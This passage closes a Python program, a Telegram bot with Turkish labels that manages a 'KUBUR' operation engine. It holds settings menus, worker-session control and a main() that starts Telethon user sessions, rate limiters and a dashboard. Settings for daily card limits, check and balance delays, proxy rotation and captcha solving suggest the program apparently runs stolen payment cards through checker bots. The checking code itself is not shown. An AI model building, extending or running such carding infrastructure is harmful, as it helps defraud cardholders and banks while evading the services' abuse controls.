    await query.edit_message_text("**Temel Ayarlar**", reply_markup=InlineKeyboardMarkup(buttons))

async def menu_workers_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    msg = "**🚀 Worker Durumları**\n\n"
    buttons = []
    for name in WORKER_SESSIONS:
        status = client_status.get(name, "free")
        role = "R+B" if 'balance' in worker_roles.get(name, []) else "Raven"
        emoji = "🟢" if status == "free" else "🔴" if status == "busy" else "⚠️"
        msg += f"{emoji} `{name}` – {role} – {status}\n"
        buttons.append([InlineKeyboardButton(name, callback_data=f"worker_{name}")])
    buttons.append([InlineKeyboardButton("🔙 Geri", callback_data="menu_main")])
    await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(buttons))

async def menu_limit_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    rate = config_data.get("rate_limit_per_minute", "15")
    daily = config_data.get("daily_card_limit", "500")
    buttons = [
        [InlineKeyboardButton(f"📈 Rate Limit: {rate}/dk", callback_data="set_rate_limit")],
        [InlineKeyboardButton(f"📅 Günlük Kart Limiti: {daily}", callback_data="set_daily_limit")],
        [InlineKeyboardButton("🔙 Geri", callback_data="menu_main")]
    ]
    await query.edit_message_text("**Limit ve Rate Ayarları**\n\nDakikada maksimum sorgu sayısı ve kullanıcı başı günlük kart limiti.", reply_markup=InlineKeyboardMarkup(buttons))

async def menu_advanced_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    proxy_list = json.loads(config_data.get("proxy_list", "[]"))
    proxy_count = len(proxy_list)
    captcha = "✅ Var" if config_data.get("captcha_api_key") else "❌ Yok"
    push = "✅ Var" if config_data.get("pushover_user_key") else "❌ Yok"
    buttons = [
        [InlineKeyboardButton(f"🌍 Proxy ({proxy_count} adet)", callback_data="set_proxy")],
        [InlineKeyboardButton(f"🤖 Captcha: {captcha}", callback_data="set_captcha")],
        [InlineKeyboardButton(f"📱 Push Bildirim: {push}", callback_data="set_push")],
        [InlineKeyboardButton("🔙 Geri", callback_data="menu_main")]
    ]
    await query.edit_message_text("**Gelişmiş Ayarlar**\n\nProxy, Captcha ve Push bildirim ayarları.", reply_markup=InlineKeyboardMarkup(buttons))

async def menu_session_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    auto_fix = "✅ Açık" if config_data.get("auto_fix_session") == "true" else "❌ Kapalı"
    buttons = [
        [InlineKeyboardButton(f"🔄 Otomatik Session Onarım: {auto_fix}", callback_data="toggle_auto_fix")],
        [InlineKeyboardButton("⏰ Cron İşlerini Listele", callback_data="list_cron")],
        [InlineKeyboardButton("🔙 Geri", callback_data="menu_main")]
    ]
    await query.edit_message_text("**Session ve Cron Ayarları**", reply_markup=InlineKeyboardMarkup(buttons))

async def menu_report_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    dashboard = "✅ Açık" if config_data.get("enable_web_dashboard") == "true" else "❌ Kapalı"
    port = config_data.get("web_dashboard_port", "5000")
    fmt = "HTML" if config_data.get("report_format") == "html" else "TXT"
    buttons = [
        [InlineKeyboardButton(f"📊 Web Dashboard: {dashboard}", callback_data="toggle_dashboard")],
        [InlineKeyboardButton(f"🔌 Dashboard Port: {port}", callback_data="set_dashboard_port")],
        [InlineKeyboardButton(f"📄 Rapor Formatı: {fmt}", callback_data="toggle_report_format")],
        [InlineKeyboardButton("🔙 Geri", callback_data="menu_main")]
    ]
    await query.edit_message_text("**Rapor ve Dashboard Ayarları**", reply_markup=InlineKeyboardMarkup(buttons))

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    if user_id not in LOCA_LISTESI:
        await query.answer("Yetkisiz erişim!", alert=True)
        return
    data = query.data
    
    if data == "menu_main":
        buttons = [
            [InlineKeyboardButton("⚙️ Temel Ayarlar", callback_data="menu_temel")],
            [InlineKeyboardButton("🚀 Worker Yönetimi", callback_data="menu_workers")],
            [InlineKeyboardButton("📊 Limit & Rate", callback_data="menu_limit")],
            [InlineKeyboardButton("🔧 Gelişmiş", callback_data="menu_advanced")],
            [InlineKeyboardButton("🔄 Session & Cron", callback_data="menu_session")],
            [InlineKeyboardButton("📁 Rapor & Dashboard", callback_data="menu_report")],
            [InlineKeyboardButton("❌ Kapat", callback_data="menu_close")]
        ]
        await query.edit_message_text("⚙️ **KUBUR AYAR MENÜSÜ**\nButonlara tıklayarak ayarları değiştirin.", reply_markup=InlineKeyboardMarkup(buttons))
        await query.answer()
        return
    elif data == "menu_temel":
        await menu_temel_callback(update, context)
    elif data == "menu_workers":
        await menu_workers_callback(update, context)
    elif data == "menu_limit":
        await menu_limit_callback(update, context)
    elif data == "menu_advanced":
        await menu_advanced_callback(update, context)
    elif data == "menu_session":
        await menu_session_callback(update, context)
    elif data == "menu_report":
        await menu_report_callback(update, context)
    elif data == "menu_close":
        await query.edit_message_text("Menü kapatıldı.")
        await query.answer()
        return
    elif data == "toggle_mizah":
        current = config_data.get("mizah_ac") == "true"
        new_val = "false" if current else "true"
        await save_config("mizah_ac", new_val)
        config_data["mizah_ac"] = new_val
        await query.answer(f"Mizah {'açıldı' if new_val=='true' else 'kapatıldı'}")
        await menu_temel_callback(update, context)
        return
    elif data == "toggle_lang":
        current = config_data.get("language", "tr")
        new_val = "en" if current == "tr" else "tr"
        await save_config("language", new_val)
        config_data["language"] = new_val
        await query.answer(f"Dil {'İngilizce' if new_val=='en' else 'Türkçe'} olarak değiştirildi")
        await menu_temel_callback(update, context)
        return
    elif data == "toggle_auto_fix":
        current = config_data.get("auto_fix_session") == "true"
        new_val = "false" if current else "true"
        await save_config("auto_fix_session", new_val)
        config_data["auto_fix_session"] = new_val
        await query.answer(f"Otomatik session onarım {'aktif' if new_val=='true' else 'pasif'}")
        await menu_session_callback(update, context)
        return
    elif data == "toggle_dashboard":
        current = config_data.get("enable_web_dashboard") == "true"
        new_val = "false" if current else "true"
        await save_config("enable_web_dashboard", new_val)
        config_data["enable_web_dashboard"] = new_val
        await query.answer(f"Web dashboard {'başlatıldı' if new_val=='true' else 'durduruldu'} (yeniden başlat gerekebilir)")
        await menu_report_callback(update, context)
        return
    elif data == "toggle_report_format":
        current = config_data.get("report_format", "txt")
        new_val = "html" if current == "txt" else "txt"
        await save_config("report_format", new_val)
        config_data["report_format"] = new_val
        await query.answer(f"Rapor formatı {new_val.upper()}")
        await menu_report_callback(update, context)
        return
    elif data in ["set_chk_delay", "set_bal_delay", "set_rate_limit", "set_daily_limit", "set_dashboard_port"]:
        key_map = {
            "set_chk_delay": "chk_delay",
            "set_bal_delay": "bal_delay",
            "set_rate_limit": "rate_limit_per_minute",
            "set_daily_limit": "daily_card_limit",
            "set_dashboard_port": "web_dashboard_port"
        }
        key = key_map[data]
        await query.answer(f"{key} için yeni değer girin (sayı):", alert=True)
        context.user_data['awaiting_value'] = key
        return
    elif data.startswith("worker_"):
        worker_name = data.split("_")[1]
        buttons = [
            [InlineKeyboardButton("🔄 Onar (repair)", callback_data=f"repair_{worker_name}")],
            [InlineKeyboardButton("🔙 Geri", callback_data="menu_workers")]
        ]
        await query.edit_message_text(f"**Worker: {worker_name}**\nDurum: {client_status.get(worker_name)}\nYetki: {worker_roles.get(worker_name)}\n\nNe yapmak istersiniz?", reply_markup=InlineKeyboardMarkup(buttons))
        await query.answer()
        return
    elif data.startswith("repair_"):
        worker_name = data.split("_")[1]
        await query.answer(f"Onarılıyor: {worker_name}")
        success = await repair_session(worker_name)
        if success:
            await query.message.reply_text(f"✅ {worker_name} onarıldı.")
        else:
            await query.message.reply_text(f"❌ {worker_name} onarılamadı.")
        await menu_workers_callback(update, context)
        return
    elif data == "list_cron":
        await query.answer("Cron işleri: saatlik yedekleme, gece yarısı limit sıfırlama.")
        await menu_session_callback(update, context)
        return
    elif data in ["set_proxy", "set_captcha", "set_push"]:
        await query.answer("Bu ayar için /ayarla komutunu kullanın. Örn: /ayarla proxy_list '[{\"http\":\"ip:port\"}]'", alert=True)
        return

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in LOCA_LISTESI:
        return
    if 'awaiting_value' in context.user_data:
        key = context.user_data.pop('awaiting_value')
        if update.message.text.isdigit():
            await save_config(key, update.message.text)
            config_data[key] = update.message.text
            await update.message.reply_text(f"✅ {key} = {update.message.text} olarak ayarlandı.")
            # Menüyü yenile
            if key in ["chk_delay", "bal_delay"]:
                await menu_temel_callback(update, context)
            elif key in ["rate_limit_per_minute", "daily_card_limit"]:
                await menu_limit_callback(update, context)
            elif key == "web_dashboard_port":
                await menu_report_callback(update, context)
        else:
            await update.message.reply_text("❌ Lütfen sayısal bir değer girin.")

# =========================== ANA FONKSİYON (KART İŞLEMLERİ + BOT API) ===========================
async def main():
    global config_data
    await init_db()
    config_data = await load_config()
    
    # Kart işlemleri için user_client başlat
    await user_client.start()
    logger.info(f"Kullanıcı client {SESSION_NAME} başlatıldı.")
    
    # Worker'ları başlat
    for name in WORKER_SESSIONS:
        cl = TelegramClient(name, API_ID, API_HASH)
        await cl.start()
        clients_pool[name] = cl
        client_status[name] = "free"
        me = await cl.get_me()
        if me.id == 1915443851:
            worker_roles[name] = ['raven', 'balance']
        else:
            worker_roles[name] = ['raven']
        rate_limiters[name] = RateLimiter(int(config_data.get("rate_limit_per_minute", "15")))
        logger.info(f"Worker {name} başlatıldı. Yetkiler: {worker_roles[name]}")
    
    # Arka plan görevleri
    asyncio.create_task(session_auto_fix_loop())
    asyncio.create_task(balance_worker_loop())
    asyncio.create_task(cron_runner())
    
    # Web dashboard
    if config_data.get("enable_web_dashboard") == "true":
        threading.Thread(target=start_web_dashboard, daemon=True).start()
        logger.info(f"Web dashboard başlatıldı: port {config_data.get('web_dashboard_port')}")
    
    # Telegram Bot API (yönetim botu)
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ping", ping))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("workers", workers_command))
    application.add_handler(CommandHandler("yedekle", yedekle))
    application.add_handler(CommandHandler("session_kurtar", session_kurtar))
    application.add_handler(CommandHandler("limit", limit_command))
    application.add_handler(CommandHandler("mizah", mizah_command))
    application.add_handler(CommandHandler("iptal", iptal_command))
    application.add_handler(CommandHandler("devam", devam_command))
    application.add_handler(CommandHandler("dur", dur_command))
    application.add_handler(CommandHandler("ayar", ayar_menu))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    
    # Bot'u başlat (polling)
    asyncio.create_task(application.initialize())
    asyncio.create_task(application.start())
    asyncio.create_task(application.updater.start_polling())
    logger.info("Yönetim botu başlatıldı, polling yapıyor...")
    
    print(Fore.GREEN + "╔══════════════════════════════════════════════════════════════╗" + Style.RESET_ALL)
    print(Fore.GREEN + "║     KUBUR OPERASYON MOTORU - AYRI BOT İLE YÖNETİM         ║" + Style.RESET_ALL)
    print(Fore.GREEN + "║        Kart işlemleri kullanıcı session'ları ile          ║" + Style.RESET_ALL)
    print(Fore.GREEN + "║        Ayarlar ve yönetim @KUBUR_YonetimBot ile           ║" + Style.RESET_ALL)
    print(Fore.GREEN + "╚══════════════════════════════════════════════════════════════╝" + Style.RESET_ALL)
    
    # Ana kullanıcı client'ını çalıştır (kart işlemleri için)
    await user_client.run_until_disconnected()

if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("Kapatılıyor...")
    finally:
        async def shutdown():
            tasks = []
            for c in clients_pool.values():
                tasks.append(c.disconnect())
            if user_client and user_client.is_connected():
                tasks.append(user_client.disconnect())
            await asyncio.gather(*tasks, return_exceptions=True)
        loop.run_until_complete(shutdown())
        loop.close()
        print("KUBUR motoru durduruldu.")
